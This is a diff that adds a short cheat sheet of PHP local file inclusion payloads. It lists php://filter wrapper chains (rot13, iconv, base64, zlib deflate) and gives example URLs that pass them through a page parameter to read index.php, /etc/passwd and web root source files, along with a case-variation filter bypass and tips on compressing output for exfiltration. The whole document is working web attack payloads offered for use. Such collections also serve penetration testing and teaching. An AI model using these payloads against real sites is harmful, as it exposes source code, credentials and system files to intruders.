@@ -1,0 +1,22 @@
+php://filter/read=string.rot13/resource=index.php	Display index.php as rot13
+
+php://filter/convert.iconv.utf-8.utf-16/resource=index.php	Encode index.php from utf8 to utf16
+
+php://filter/convert.base64-encode/resource=index.php	Display index.php as a base64 encoded string
+
+Example: 
+
+http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
+http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
+http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
+http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
+
+
+*****Wrappers can be chained with a compression wrapper for large files.******
+
+http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
+
+NOTE: Wrappers can be chained multiple times using | or /:
+
+Multiple base64 decodes: php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=%s
+deflate then base64encode (useful for limited character exfil): php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/index.php
